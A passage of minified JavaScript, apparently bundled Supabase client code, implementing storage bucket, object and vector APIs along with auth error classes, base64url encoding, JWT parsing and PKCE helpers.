fc(ro(e),e))},Vy=(e,t,r,s)=>{const a={method:e,headers:(t==null?void 0:t.headers)||{}};return e==="GET"||!s?a:(Uy(s)?(a.headers=q({"Content-Type":"application/json"},t==null?void 0:t.headers),a.body=JSON.stringify(s)):a.body=s,t!=null&&t.duplex&&(a.duplex=t.duplex),q(q({},a),r))};async function Ea(e,t,r,s,a,i){return new Promise((l,o)=>{e(r,Vy(t,s,a,i)).then(c=>{if(!c.ok)throw c;return s!=null&&s.noResolveJson?c:c.json()}).then(c=>l(c)).catch(c=>Wy(c,o,s))})}async function ya(e,t,r,s){return Ea(e,"GET",t,r,s)}async function Ot(e,t,r,s,a){return Ea(e,"POST",t,s,a,r)}async function pc(e,t,r,s,a){return Ea(e,"PUT",t,s,a,r)}async function qy(e,t,r,s){return Ea(e,"HEAD",t,q(q({},r),{},{noResolveJson:!0}),s)}async function Eu(e,t,r,s,a){return Ea(e,"DELETE",t,s,a,r)}var Hy=class{constructor(e,t){this.downloadFn=e,this.shouldThrowOnError=t}then(e,t){return this.execute().then(e,t)}async execute(){var e=this;try{return{data:(await e.downloadFn()).body,error:null}}catch(t){if(e.shouldThrowOnError)throw t;if(ye(t))return{data:null,error:t};throw t}}};let Xm;Xm=Symbol.toStringTag;var Ky=class{constructor(e,t){this.downloadFn=e,this.shouldThrowOnError=t,this[Xm]="BlobDownloadBuilder",this.promise=null}asStream(){return new Hy(this.downloadFn,this.shouldThrowOnError)}then(e,t){return this.getPromise().then(e,t)}catch(e){return this.getPromise().catch(e)}finally(e){return this.getPromise().finally(e)}getPromise(){return this.promise||(this.promise=this.execute()),this.promise}async execute(){var e=this;try{return{data:await(await e.downloadFn()).blob(),error:null}}catch(t){if(e.shouldThrowOnError)throw t;if(ye(t))return{data:null,error:t};throw t}}};const Gy={limit:100,offset:0,sortBy:{column:"name",order:"asc"}},nh={cacheControl:"3600",contentType:"text/plain;charset=UTF-8",upsert:!1};var Jy=class{constructor(e,t={},r,s){this.shouldThrowOnError=!1,this.url=e,this.headers=t,this.bucketId=r,this.fetch=Su(s)}throwOnError(){return this.shouldThrowOnError=!0,this}async uploadOrUpdate(e,t,r,s){var a=this;try{let i;const l=q(q({},nh),s);let o=q(q({},a.headers),e==="POST"&&{"x-upsert":String(l.upsert)});const c=l.metadata;typeof Blob<"u"&&r instanceof Blob?(i=new FormData,i.append("cacheControl",l.cacheControl),c&&i.append("metadata",a.encodeMetadata(c)),i.append("",r)):typeof FormData<"u"&&r instanceof FormData?(i=r,i.has("cacheControl")||i.append("cacheControl",l.cacheControl),c&&!i.has("metadata")&&i.append("metadata",a.encodeMetadata(c))):(i=r,o["cache-control"]=`max-age=${l.cacheControl}`,o["content-type"]=l.contentType,c&&(o["x-metadata"]=a.toBase64(a.encodeMetadata(c))),(typeof ReadableStream<"u"&&i instanceof ReadableStream||i&&typeof i=="object"&&"pipe"in i&&typeof i.pipe=="function")&&!l.duplex&&(l.duplex="half")),s!=null&&s.headers&&(o=q(q({},o),s.headers));const u=a._removeEmptyFolders(t),h=a._getFinalPath(u),p=await(e=="PUT"?pc:Ot)(a.fetch,`${a.url}/object/${h}`,i,q({headers:o},l!=null&&l.duplex?{duplex:l.duplex}:{}));return{data:{path:u,id:p.Id,fullPath:p.Key},error:null}}catch(i){if(a.shouldThrowOnError)throw i;if(ye(i))return{data:null,error:i};throw i}}async upload(e,t,r){return this.uploadOrUpdate("POST",e,t,r)}async uploadToSignedUrl(e,t,r,s){var a=this;const i=a._removeEmptyFolders(e),l=a._getFinalPath(i),o=new URL(a.url+`/object/upload/sign/${l}`);o.searchParams.set("token",t);try{let c;const u=q({upsert:nh.upsert},s),h=q(q({},a.headers),{"x-upsert":String(u.upsert)});return typeof Blob<"u"&&r instanceof Blob?(c=new FormData,c.append("cacheControl",u.cacheControl),c.append("",r)):typeof FormData<"u"&&r instanceof FormData?(c=r,c.append("cacheControl",u.cacheControl)):(c=r,h["cache-control"]=`max-age=${u.cacheControl}`,h["content-type"]=u.contentType),{data:{path:i,fullPath:(await pc(a.fetch,o.toString(),c,{headers:h})).Key},error:null}}catch(c){if(a.shouldThrowOnError)throw c;if(ye(c))return{data:null,error:c};throw c}}async createSignedUploadUrl(e,t){var r=this;try{let s=r._getFinalPath(e);const a=q({},r.headers);t!=null&&t.upsert&&(a["x-upsert"]="true");const i=await Ot(r.fetch,`${r.url}/object/upload/sign/${s}`,{},{headers:a}),l=new URL(r.url+i.url),o=l.searchParams.get("token");if(!o)throw new ul("No token returned by API");return{data:{signedUrl:l.toString(),path:e,token:o},error:null}}catch(s){if(r.shouldThrowOnError)throw s;if(ye(s))return{data:null,error:s};throw s}}async update(e,t,r){return this.uploadOrUpdate("PUT",e,t,r)}async move(e,t,r){var s=this;try{return{data:await Ot(s.fetch,`${s.url}/object/move`,{bucketId:s.bucketId,sourceKey:e,destinationKey:t,destinationBucket:r==null?void 0:r.destinationBucket},{headers:s.headers}),error:null}}catch(a){if(s.shouldThrowOnError)throw a;if(ye(a))return{data:null,error:a};throw a}}async copy(e,t,r){var s=this;try{return{data:{path:(await Ot(s.fetch,`${s.url}/object/copy`,{bucketId:s.bucketId,sourceKey:e,destinationKey:t,destinationBucket:r==null?void 0:r.destinationBucket},{headers:s.headers})).Key},error:null}}catch(a){if(s.shouldThrowOnError)throw a;if(ye(a))return{data:null,error:a};throw a}}async createSignedUrl(e,t,r){var s=this;try{let a=s._getFinalPath(e),i=await Ot(s.fetch,`${s.url}/object/sign/${a}`,q({expiresIn:t},r!=null&&r.transform?{transform:r.transform}:{}),{headers:s.headers});const l=r!=null&&r.download?`&download=${r.download===!0?"":r.download}`:"";return i={signedUrl:encodeURI(`${s.url}${i.signedURL}${l}`)},{data:i,error:null}}catch(a){if(s.shouldThrowOnError)throw a;if(ye(a))return{data:null,error:a};throw a}}async createSignedUrls(e,t,r){var s=this;try{const a=await Ot(s.fetch,`${s.url}/object/sign/${s.bucketId}`,{expiresIn:t,paths:e},{headers:s.headers}),i=r!=null&&r.download?`&download=${r.download===!0?"":r.download}`:"";return{data:a.map(l=>q(q({},l),{},{signedUrl:l.signedURL?encodeURI(`${s.url}${l.signedURL}${i}`):null})),error:null}}catch(a){if(s.shouldThrowOnError)throw a;if(ye(a))return{data:null,error:a};throw a}}download(e,t){const r=typeof(t==null?void 0:t.transform)<"u"?"render/image/authenticated":"object",s=this.transformOptsToQueryString((t==null?void 0:t.transform)||{}),a=s?`?${s}`:"",i=this._getFinalPath(e),l=()=>ya(this.fetch,`${this.url}/${r}/${i}${a}`,{headers:this.headers,noResolveJson:!0});return new Ky(l,this.shouldThrowOnError)}async info(e){var t=this;const r=t._getFinalPath(e);try{return{data:mc(await ya(t.fetch,`${t.url}/object/info/${r}`,{headers:t.headers})),error:null}}catch(s){if(t.shouldThrowOnError)throw s;if(ye(s))return{data:null,error:s};throw s}}async exists(e){var t=this;const r=t._getFinalPath(e);try{return await qy(t.fetch,`${t.url}/object/${r}`,{headers:t.headers}),{data:!0,error:null}}catch(s){if(t.shouldThrowOnError)throw s;if(ye(s)&&s instanceof fc){const a=s.originalError;if([400,404].includes(a==null?void 0:a.status))return{data:!1,error:s}}throw s}}getPublicUrl(e,t){const r=this._getFinalPath(e),s=[],a=t!=null&&t.download?`download=${t.download===!0?"":t.download}`:"";a!==""&&s.push(a);const i=typeof(t==null?void 0:t.transform)<"u"?"render/image":"object",l=this.transformOptsToQueryString((t==null?void 0:t.transform)||{});l!==""&&s.push(l);let o=s.join("&");return o!==""&&(o=`?${o}`),{data:{publicUrl:encodeURI(`${this.url}/${i}/public/${r}${o}`)}}}async remove(e){var t=this;try{return{data:await Eu(t.fetch,`${t.url}/object/${t.bucketId}`,{prefixes:e},{headers:t.headers}),error:null}}catch(r){if(t.shouldThrowOnError)throw r;if(ye(r))return{data:null,error:r};throw r}}async list(e,t,r){var s=this;try{const a=q(q(q({},Gy),t),{},{prefix:e||""});return{data:await Ot(s.fetch,`${s.url}/object/list/${s.bucketId}`,a,{headers:s.headers},r),error:null}}catch(a){if(s.shouldThrowOnError)throw a;if(ye(a))return{data:null,error:a};throw a}}async listV2(e,t){var r=this;try{const s=q({},e);return{data:await Ot(r.fetch,`${r.url}/object/list-v2/${r.bucketId}`,s,{headers:r.headers},t),error:null}}catch(s){if(r.shouldThrowOnError)throw s;if(ye(s))return{data:null,error:s};throw s}}encodeMetadata(e){return JSON.stringify(e)}toBase64(e){return typeof Buffer<"u"?Buffer.from(e).toString("base64"):btoa(e)}_getFinalPath(e){return`${this.bucketId}/${e.replace(/^\/+/,"")}`}_removeEmptyFolders(e){return e.replace(/^\/|\/$/g,"").replace(/\/+/g,"/")}transformOptsToQueryString(e){const t=[];return e.width&&t.push(`width=${e.width}`),e.height&&t.push(`height=${e.height}`),e.resize&&t.push(`resize=${e.resize}`),e.format&&t.push(`format=${e.format}`),e.quality&&t.push(`quality=${e.quality}`),t.join("&")}};const Zm="2.90.1",ep={"X-Client-Info":`storage-js/${Zm}`};var Yy=class{constructor(e,t={},r,s){this.shouldThrowOnError=!1;const a=new URL(e);s!=null&&s.useNewHostname&&/supabase\.(co|in|red)$/.test(a.hostname)&&!a.hostname.includes("storage.supabase.")&&(a.hostname=a.hostname.replace("supabase.","storage.supabase.")),this.url=a.href.replace(/\/$/,""),this.headers=q(q({},ep),t),this.fetch=Su(r)}throwOnError(){return this.shouldThrowOnError=!0,this}async listBuckets(e){var t=this;try{const r=t.listBucketOptionsToQueryString(e);return{data:await ya(t.fetch,`${t.url}/bucket${r}`,{headers:t.headers}),error:null}}catch(r){if(t.shouldThrowOnError)throw r;if(ye(r))return{data:null,error:r};throw r}}async getBucket(e){var t=this;try{return{data:await ya(t.fetch,`${t.url}/bucket/${e}`,{headers:t.headers}),error:null}}catch(r){if(t.shouldThrowOnError)throw r;if(ye(r))return{data:null,error:r};throw r}}async createBucket(e,t={public:!1}){var r=this;try{return{data:await Ot(r.fetch,`${r.url}/bucket`,{id:e,name:e,type:t.type,public:t.public,file_size_limit:t.fileSizeLimit,allowed_mime_types:t.allowedMimeTypes},{headers:r.headers}),error:null}}catch(s){if(r.shouldThrowOnError)throw s;if(ye(s))return{data:null,error:s};throw s}}async updateBucket(e,t){var r=this;try{return{data:await pc(r.fetch,`${r.url}/bucket/${e}`,{id:e,name:e,public:t.public,file_size_limit:t.fileSizeLimit,allowed_mime_types:t.allowedMimeTypes},{headers:r.headers}),error:null}}catch(s){if(r.shouldThrowOnError)throw s;if(ye(s))return{data:null,error:s};throw s}}async emptyBucket(e){var t=this;try{return{data:await Ot(t.fetch,`${t.url}/bucket/${e}/empty`,{},{headers:t.headers}),error:null}}catch(r){if(t.shouldThrowOnError)throw r;if(ye(r))return{data:null,error:r};throw r}}async deleteBucket(e){var t=this;try{return{data:await Eu(t.fetch,`${t.url}/bucket/${e}`,{},{headers:t.headers}),error:null}}catch(r){if(t.shouldThrowOnError)throw r;if(ye(r))return{data:null,error:r};throw r}}listBucketOptionsToQueryString(e){const t={};return e&&("limit"in e&&(t.limit=String(e.limit)),"offset"in e&&(t.offset=String(e.offset)),e.search&&(t.search=e.search),e.sortColumn&&(t.sortColumn=e.sortColumn),e.sortOrder&&(t.sortOrder=e.sortOrder)),Object.keys(t).length>0?"?"+new URLSearchParams(t).toString():""}},Qy=class{constructor(e,t={},r){this.shouldThrowOnError=!1,this.url=e.replace(/\/$/,""),this.headers=q(q({},ep),t),this.fetch=Su(r)}throwOnError(){return this.shouldThrowOnError=!0,this}async createBucket(e){var t=this;try{return{data:await Ot(t.fetch,`${t.url}/bucket`,{name:e},{headers:t.headers}),error:null}}catch(r){if(t.shouldThrowOnError)throw r;if(ye(r))return{data:null,error:r};throw r}}async listBuckets(e){var t=this;try{const r=new URLSearchParams;(e==null?void 0:e.limit)!==void 0&&r.set("limit",e.limit.toString()),(e==null?void 0:e.offset)!==void 0&&r.set("offset",e.offset.toString()),e!=null&&e.sortColumn&&r.set("sortColumn",e.sortColumn),e!=null&&e.sortOrder&&r.set("sortOrder",e.sortOrder),e!=null&&e.search&&r.set("search",e.search);const s=r.toString(),a=s?`${t.url}/bucket?${s}`:`${t.url}/bucket`;return{data:await ya(t.fetch,a,{headers:t.headers}),error:null}}catch(r){if(t.shouldThrowOnError)throw r;if(ye(r))return{data:null,error:r};throw r}}async deleteBucket(e){var t=this;try{return{data:await Eu(t.fetch,`${t.url}/bucket/${e}`,{},{headers:t.headers}),error:null}}catch(r){if(t.shouldThrowOnError)throw r;if(ye(r))return{data:null,error:r};throw r}}from(e){var t=this;if(!Dy(e))throw new ul("Invalid bucket name: File, folder, and bucket names must follow AWS object key naming guidelines and should avoid the use of any other characters.");const r=new $y({baseUrl:this.url,catalogName:e,auth:{type:"custom",getHeaders:async()=>t.headers},fetch:this.fetch}),s=this.shouldThrowOnError;return new Proxy(r,{get(a,i){const l=a[i];return typeof l!="function"?l:async(...o)=>{try{return{data:await l.apply(a,o),error:null}}catch(c){if(s)throw c;return{data:null,error:c}}}}})}};const Cu={"X-Client-Info":`storage-js/${Zm}`,"Content-Type":"application/json"};var tp=class extends Error{constructor(e){super(e),this.__isStorageVectorsError=!0,this.name="StorageVectorsError"}};function ut(e){return typeof e=="object"&&e!==null&&"__isStorageVectorsError"in e}var so=class extends tp{constructor(e,t,r){super(e),this.name="StorageVectorsApiError",this.status=t,this.statusCode=r}toJSON(){return{name:this.name,message:this.message,status:this.status,statusCode:this.statusCode}}},Xy=class extends tp{constructor(e,t){super(e),this.name="StorageVectorsUnknownError",this.originalError=t}};const Tu=e=>e?(...t)=>e(...t):(...t)=>fetch(...t),Zy=e=>{if(typeof e!="object"||e===null)return!1;const t=Object.getPrototypeOf(e);return(t===null||t===Object.prototype||Object.getPrototypeOf(t)===null)&&!(Symbol.toStringTag in e)&&!(Symbol.iterator in e)},ah=e=>e.msg||e.message||e.error_description||e.error||JSON.stringify(e),ev=async(e,t,r)=>{if(e&&typeof e=="object"&&"status"in e&&"ok"in e&&typeof e.status=="number"&&!(r!=null&&r.noResolveJson)){const s=e.status||500,a=e;if(typeof a.json=="function")a.json().then(i=>{const l=(i==null?void 0:i.statusCode)||(i==null?void 0:i.code)||s+"";t(new so(ah(i),s,l))}).catch(()=>{const i=s+"";t(new so(a.statusText||`HTTP ${s} error`,s,i))});else{const i=s+"";t(new so(a.statusText||`HTTP ${s} error`,s,i))}}else t(new Xy(ah(e),e))},tv=(e,t,r,s)=>{const a={method:e,headers:(t==null?void 0:t.headers)||{}};return s?(Zy(s)?(a.headers=q({"Content-Type":"application/json"},t==null?void 0:t.headers),a.body=JSON.stringify(s)):a.body=s,q(q({},a),r)):a};async function rv(e,t,r,s,a,i){return new Promise((l,o)=>{e(r,tv(t,s,a,i)).then(c=>{if(!c.ok)throw c;if(s!=null&&s.noResolveJson)return c;const u=c.headers.get("content-type");return!u||!u.includes("application/json")?{}:c.json()}).then(c=>l(c)).catch(c=>ev(c,o,s))})}async function dt(e,t,r,s,a){return rv(e,"POST",t,s,a,r)}var sv=class{constructor(e,t={},r){this.shouldThrowOnError=!1,this.url=e.replace(/\/$/,""),this.headers=q(q({},Cu),t),this.fetch=Tu(r)}throwOnError(){return this.shouldThrowOnError=!0,this}async createIndex(e){var t=this;try{return{data:await dt(t.fetch,`${t.url}/CreateIndex`,e,{headers:t.headers})||{},error:null}}catch(r){if(t.shouldThrowOnError)throw r;if(ut(r))return{data:null,error:r};throw r}}async getIndex(e,t){var r=this;try{return{data:await dt(r.fetch,`${r.url}/GetIndex`,{vectorBucketName:e,indexName:t},{headers:r.headers}),error:null}}catch(s){if(r.shouldThrowOnError)throw s;if(ut(s))return{data:null,error:s};throw s}}async listIndexes(e){var t=this;try{return{data:await dt(t.fetch,`${t.url}/ListIndexes`,e,{headers:t.headers}),error:null}}catch(r){if(t.shouldThrowOnError)throw r;if(ut(r))return{data:null,error:r};throw r}}async deleteIndex(e,t){var r=this;try{return{data:await dt(r.fetch,`${r.url}/DeleteIndex`,{vectorBucketName:e,indexName:t},{headers:r.headers})||{},error:null}}catch(s){if(r.shouldThrowOnError)throw s;if(ut(s))return{data:null,error:s};throw s}}},nv=class{constructor(e,t={},r){this.shouldThrowOnError=!1,this.url=e.replace(/\/$/,""),this.headers=q(q({},Cu),t),this.fetch=Tu(r)}throwOnError(){return this.shouldThrowOnError=!0,this}async putVectors(e){var t=this;try{if(e.vectors.length<1||e.vectors.length>500)throw new Error("Vector batch size must be between 1 and 500 items");return{data:await dt(t.fetch,`${t.url}/PutVectors`,e,{headers:t.headers})||{},error:null}}catch(r){if(t.shouldThrowOnError)throw r;if(ut(r))return{data:null,error:r};throw r}}async getVectors(e){var t=this;try{return{data:await dt(t.fetch,`${t.url}/GetVectors`,e,{headers:t.headers}),error:null}}catch(r){if(t.shouldThrowOnError)throw r;if(ut(r))return{data:null,error:r};throw r}}async listVectors(e){var t=this;try{if(e.segmentCount!==void 0){if(e.segmentCount<1||e.segmentCount>16)throw new Error("segmentCount must be between 1 and 16");if(e.segmentIndex!==void 0&&(e.segmentIndex<0||e.segmentIndex>=e.segmentCount))throw new Error(`segmentIndex must be between 0 and ${e.segmentCount-1}`)}return{data:await dt(t.fetch,`${t.url}/ListVectors`,e,{headers:t.headers}),error:null}}catch(r){if(t.shouldThrowOnError)throw r;if(ut(r))return{data:null,error:r};throw r}}async queryVectors(e){var t=this;try{return{data:await dt(t.fetch,`${t.url}/QueryVectors`,e,{headers:t.headers}),error:null}}catch(r){if(t.shouldThrowOnError)throw r;if(ut(r))return{data:null,error:r};throw r}}async deleteVectors(e){var t=this;try{if(e.keys.length<1||e.keys.length>500)throw new Error("Keys batch size must be between 1 and 500 items");return{data:await dt(t.fetch,`${t.url}/DeleteVectors`,e,{headers:t.headers})||{},error:null}}catch(r){if(t.shouldThrowOnError)throw r;if(ut(r))return{data:null,error:r};throw r}}},av=class{constructor(e,t={},r){this.shouldThrowOnError=!1,this.url=e.replace(/\/$/,""),this.headers=q(q({},Cu),t),this.fetch=Tu(r)}throwOnError(){return this.shouldThrowOnError=!0,this}async createBucket(e){var t=this;try{return{data:await dt(t.fetch,`${t.url}/CreateVectorBucket`,{vectorBucketName:e},{headers:t.headers})||{},error:null}}catch(r){if(t.shouldThrowOnError)throw r;if(ut(r))return{data:null,error:r};throw r}}async getBucket(e){var t=this;try{return{data:await dt(t.fetch,`${t.url}/GetVectorBucket`,{vectorBucketName:e},{headers:t.headers}),error:null}}catch(r){if(t.shouldThrowOnError)throw r;if(ut(r))return{data:null,error:r};throw r}}async listBuckets(e={}){var t=this;try{return{data:await dt(t.fetch,`${t.url}/ListVectorBuckets`,e,{headers:t.headers}),error:null}}catch(r){if(t.shouldThrowOnError)throw r;if(ut(r))return{data:null,error:r};throw r}}async deleteBucket(e){var t=this;try{return{data:await dt(t.fetch,`${t.url}/DeleteVectorBucket`,{vectorBucketName:e},{headers:t.headers})||{},error:null}}catch(r){if(t.shouldThrowOnError)throw r;if(ut(r))return{data:null,error:r};throw r}}},iv=class extends av{constructor(e,t={}){super(e,t.headers||{},t.fetch)}from(e){return new lv(this.url,this.headers,e,this.fetch)}async createBucket(e){var t=()=>super.createBucket,r=this;return t().call(r,e)}async getBucket(e){var t=()=>super.getBucket,r=this;return t().call(r,e)}async listBuckets(e={}){var t=()=>super.listBuckets,r=this;return t().call(r,e)}async deleteBucket(e){var t=()=>super.deleteBucket,r=this;return t().call(r,e)}},lv=class extends sv{constructor(e,t,r,s){super(e,t,s),this.vectorBucketName=r}async createIndex(e){var t=()=>super.createIndex,r=this;return t().call(r,q(q({},e),{},{vectorBucketName:r.vectorBucketName}))}async listIndexes(e={}){var t=()=>super.listIndexes,r=this;return t().call(r,q(q({},e),{},{vectorBucketName:r.vectorBucketName}))}async getIndex(e){var t=()=>super.getIndex,r=this;return t().call(r,r.vectorBucketName,e)}async deleteIndex(e){var t=()=>super.deleteIndex,r=this;return t().call(r,r.vectorBucketName,e)}index(e){return new ov(this.url,this.headers,this.vectorBucketName,e,this.fetch)}},ov=class extends nv{constructor(e,t,r,s,a){super(e,t,a),this.vectorBucketName=r,this.indexName=s}async putVectors(e){var t=()=>super.putVectors,r=this;return t().call(r,q(q({},e),{},{vectorBucketName:r.vectorBucketName,indexName:r.indexName}))}async getVectors(e){var t=()=>super.getVectors,r=this;return t().call(r,q(q({},e),{},{vectorBucketName:r.vectorBucketName,indexName:r.indexName}))}async listVectors(e={}){var t=()=>super.listVectors,r=this;return t().call(r,q(q({},e),{},{vectorBucketName:r.vectorBucketName,indexName:r.indexName}))}async queryVectors(e){var t=()=>super.queryVectors,r=this;return t().call(r,q(q({},e),{},{vectorBucketName:r.vectorBucketName,indexName:r.indexName}))}async deleteVectors(e){var t=()=>super.deleteVectors,r=this;return t().call(r,q(q({},e),{},{vectorBucketName:r.vectorBucketName,indexName:r.indexName}))}},cv=class extends Yy{constructor(e,t={},r,s){super(e,t,r,s)}from(e){return new Jy(this.url,this.headers,e,this.fetch)}get vectors(){return new iv(this.url+"/vector",{headers:this.headers,fetch:this.fetch})}get analytics(){return new Qy(this.url+"/iceberg",this.headers,this.fetch)}};const rp="2.90.1",Os=30*1e3,xc=3,no=xc*Os,uv="http://localhost:9999",dv="supabase.auth.token",hv={"X-Client-Info":`gotrue-js/${rp}`},gc="X-Supabase-Api-Version",sp={"2024-01-01":{timestamp:Date.parse("2024-01-01T00:00:00.0Z"),name:"2024-01-01"}},fv=/^([a-z0-9_-]{4})*($|[a-z0-9_-]{3}$|[a-z0-9_-]{2}$)$/i,mv=10*60*1e3;class va extends Error{constructor(t,r,s){super(t),this.__isAuthError=!0,this.name="AuthError",this.status=r,this.code=s}}function M(e){return typeof e=="object"&&e!==null&&"__isAuthError"in e}class pv extends va{constructor(t,r,s){super(t,r,s),this.name="AuthApiError",this.status=r,this.code=s}}function xv(e){return M(e)&&e.name==="AuthApiError"}class us extends va{constructor(t,r){super(t),this.name="AuthUnknownError",this.originalError=r}}class xr extends va{constructor(t,r,s,a){super(t,s,a),this.name=r,this.status=s}}class ot extends xr{constructor(){super("Auth session missing!","AuthSessionMissingError",400,void 0)}}function gv(e){return M(e)&&e.name==="AuthSessionMissingError"}class Es extends xr{constructor(){super("Auth session or user missing","AuthInvalidTokenResponseError",500,void 0)}}class Ka extends xr{constructor(t){super(t,"AuthInvalidCredentialsError",400,void 0)}}class Ga extends xr{constructor(t,r=null){super(t,"AuthImplicitGrantRedirectError",500,void 0),this.details=null,this.details=r}toJSON(){return{name:this.name,message:this.message,status:this.status,details:this.details}}}function yv(e){return M(e)&&e.name==="AuthImplicitGrantRedirectError"}class ih extends xr{constructor(t,r=null){super(t,"AuthPKCEGrantCodeExchangeError",500,void 0),this.details=null,this.details=r}toJSON(){return{name:this.name,message:this.message,status:this.status,details:this.details}}}class vv extends xr{constructor(){super("PKCE code verifier not found in storage. This can happen if the auth flow was initiated in a different browser or device, or if the storage was cleared. For SSR frameworks (Next.js, SvelteKit, etc.), use @supabase/ssr on both the server and client to store the code verifier in cookies.","AuthPKCECodeVerifierMissingError",400,"pkce_code_verifier_not_found")}}class yc extends xr{constructor(t,r){super(t,"AuthRetryableFetchError",r,void 0)}}function ao(e){return M(e)&&e.name==="AuthRetryableFetchError"}class lh extends xr{constructor(t,r,s){super(t,"AuthWeakPasswordError",r,"weak_password"),this.reasons=s}}class vc extends xr{constructor(t){super(t,"AuthInvalidJwtError",400,"invalid_jwt")}}const Mi="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_".split(""),oh=` 	
\r=`.split(""),wv=(()=>{const e=new Array(128);for(let t=0;t<e.length;t+=1)e[t]=-1;for(let t=0;t<oh.length;t+=1)e[oh[t].charCodeAt(0)]=-2;for(let t=0;t<Mi.length;t+=1)e[Mi[t].charCodeAt(0)]=t;return e})();function ch(e,t,r){if(e!==null)for(t.queue=t.queue<<8|e,t.queuedBits+=8;t.queuedBits>=6;){const s=t.queue>>t.queuedBits-6&63;r(Mi[s]),t.queuedBits-=6}else if(t.queuedBits>0)for(t.queue=t.queue<<6-t.queuedBits,t.queuedBits=6;t.queuedBits>=6;){const s=t.queue>>t.queuedBits-6&63;r(Mi[s]),t.queuedBits-=6}}function np(e,t,r){const s=wv[e];if(s>-1)for(t.queue=t.queue<<6|s,t.queuedBits+=6;t.queuedBits>=8;)r(t.queue>>t.queuedBits-8&255),t.queuedBits-=8;else{if(s===-2)return;throw new Error(`Invalid Base64-URL character "${String.fromCharCode(e)}"`)}}function uh(e){const t=[],r=l=>{t.push(String.fromCodePoint(l))},s={utf8seq:0,codepoint:0},a={queue:0,queuedBits:0},i=l=>{kv(l,s,r)};for(let l=0;l<e.length;l+=1)np(e.charCodeAt(l),a,i);return t.join("")}function bv(e,t){if(e<=127){t(e);return}else if(e<=2047){t(192|e>>6),t(128|e&63);return}else if(e<=65535){t(224|e>>12),t(128|e>>6&63),t(128|e&63);return}else if(e<=1114111){t(240|e>>18),t(128|e>>12&63),t(128|e>>6&63),t(128|e&63);return}throw new Error(`Unrecognized Unicode codepoint: ${e.toString(16)}`)}function jv(e,t){for(let r=0;r<e.length;r+=1){let s=e.charCodeAt(r);if(s>55295&&s<=56319){const a=(s-55296)*1024&65535;s=(e.charCodeAt(r+1)-56320&65535|a)+65536,r+=1}bv(s,t)}}function kv(e,t,r){if(t.utf8seq===0){if(e<=127){r(e);return}for(let s=1;s<6;s+=1)if(!(e>>7-s&1)){t.utf8seq=s;break}if(t.utf8seq===2)t.codepoint=e&31;else if(t.utf8seq===3)t.codepoint=e&15;else if(t.utf8seq===4)t.codepoint=e&7;else throw new Error("Invalid UTF-8 sequence");t.utf8seq-=1}else if(t.utf8seq>0){if(e<=127)throw new Error("Invalid UTF-8 sequence");t.codepoint=t.codepoint<<6|e&63,t.utf8seq-=1,t.utf8seq===0&&r(t.codepoint)}}function en(e){const t=[],r={queue:0,queuedBits:0},s=a=>{t.push(a)};for(let a=0;a<e.length;a+=1)np(e.charCodeAt(a),r,s);return new Uint8Array(t)}function _v(e){const t=[];return jv(e,r=>t.push(r)),new Uint8Array(t)}function ms(e){const t=[],r={queue:0,queuedBits:0},s=a=>{t.push(a)};return e.forEach(a=>ch(a,r,s)),ch(null,r,s),t.join("")}function Nv(e){return Math.round(Date.now()/1e3)+e}function Sv(){return Symbol("auth-callback")}const De=()=>typeof window<"u"&&typeof document<"u",ns={tested:!1,writable:!1},ap=()=>{if(!De())return!1;try{if(typeof globalThis.localStorage!="object")return!1}catch{return!1}if(ns.tested)return ns.writable;const e=`lswt-${Math.random()}${Math.random()}`;try{globalThis.localStorage.setItem(e,e),globalThis.localStorage.removeItem(e),ns.tested=!0,ns.writable=!0}catch{ns.tested=!0,ns.writable=!1}return ns.writable};function Ev(e){const t={},r=new URL(e);if(r.hash&&r.hash[0]==="#")try{new URLSearchParams(r.hash.substring(1)).forEach((a,i)=>{t[i]=a})}catch{}return r.searchParams.forEach((s,a)=>{t[a]=s}),t}const ip=e=>e?(...t)=>e(...t):(...t)=>fetch(...t),Cv=e=>typeof e=="object"&&e!==null&&"status"in e&&"ok"in e&&"json"in e&&typeof e.json=="function",Is=async(e,t,r)=>{await e.setItem(t,JSON.stringify(r))},as=async(e,t)=>{const r=await e.getItem(t);if(!r)return null;try{return JSON.parse(r)}catch{return r}},Ue=async(e,t)=>{await e.removeItem(t)};class dl{constructor(){this.promise=new dl.promiseConstructor((t,r)=>{this.resolve=t,this.reject=r})}}dl.promiseConstructor=Promise;function io(e){const t=e.split(".");if(t.length!==3)throw new vc("Invalid JWT structure");for(let s=0;s<t.length;s++)if(!fv.test(t[s]))throw new vc("JWT not in base64url format");return{header:JSON.parse(uh(t[0])),payload:JSON.parse(uh(t[1])),signature:en(t[2]),raw:{header:t[0],payload:t[1]}}}async function Tv(e){return await new Promise(t=>{setTimeout(()=>t(null),e)})}function Rv(e,t){return new Promise((s,a)=>{(async()=>{for(let i=0;i<1/0;i++)try{const l=await e(i);if(!t(i,null,l)){s(l);return}}catch(l){if(!t(i,l)){a(l);return}}})()})}function Pv(e){return("0"+e.toString(16)).substr(-2)}function Av(){const t=new Uint32Array(56);if(typeof crypto>"u"){const r="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-._~",s=r.length;let a="";for(let i=0;i<56;i++)a+=r.charAt(Math.floor(Math.random()*s));return a}return crypto.getRandomValues(t),Array.from(t,Pv).join("")}async function Ov(e){const r=new TextEncoder().encode(e),s=await crypto.subtle.digest("SHA-256",r),a=new Uint8Array(s);return Array.from(a).map(i=>String.fromCharCode(i)).join("")}async function Iv(e){if(!(typeof crypto<"u"&&typeof crypto.subtle<"u"&&typeof TextEncoder<"u"))return console.warn("WebCrypto API is not supported. Code challenge method will default to use plain instead of sha256."),e;const r=await Ov(e);return btoa(r).replace(/\+/g,"-").replace(/\//g,"_").replace(/=+$/,"")}async function Cs(e,t,r=!1){const s=Av();let a=s;r&&(a+="/PASSWORD_RECOVERY"),await Is(e,`${t}-code-verifier`,a);const i=await Iv(s);return[i,s===i?"plain":"s256"]}const $v=/^2[0-9]{3}-(0[1-9]|1[0-2])-(0[1-9]|1[0-9]|2[0-9]|3[0-1])$/i;function zv(e){const t=e.headers.get(gc);if(!t||!t.match($v))return null;try{return new Date(`${t}T00:00:00.0Z`)}catch{return null}}function Lv(e){if(!e)throw new Error("Missing exp claim");const t=Math.floor(Date.now()/1e3);if(e<=t)throw new Error("JWT has expired")}function Uv(e){switch(e){case"RS256":return{name:"RSASSA-PKCS1-v1_5",hash:{name:"SHA-256"}};case"ES256":return{name:"ECDSA",namedCurve:"P-256",hash:{name:"SHA-256"}};default:throw new Error("Invalid alg claim")}}const 